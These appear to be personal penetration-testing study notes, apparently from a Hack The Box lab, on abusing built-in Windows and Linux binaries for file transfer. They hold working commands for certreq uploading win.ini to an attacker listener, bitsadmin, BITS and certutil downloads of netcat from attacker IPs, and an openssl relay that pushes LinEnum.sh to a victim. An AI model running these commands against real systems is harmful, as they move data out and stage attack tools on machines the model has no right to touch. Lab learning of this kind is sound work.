# LOLBAS/Windows

## search using `/`

https://lolbas-project.github.io/lolbas/Binaries/Certreq/

`using Certreq for uploading:`

```title:attacker
$ sudo nc -lvnp 8000
```

```title:victim
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

###

```title:Bitsadmin-Download function
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\vipa0z\Desktop\nc.exe
```

```powershell-session title:downloading via title:download-ps-bitsadmin
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

`Download using CertUtil [detectable by Antimalware Scan Interface]`

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

## GTFOBINS

for linux `+file download` or `+file upload`

using openSSL for downloading:

```title:gen-server-cert
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

```title:start-server
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

```bash title:VICTIM
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
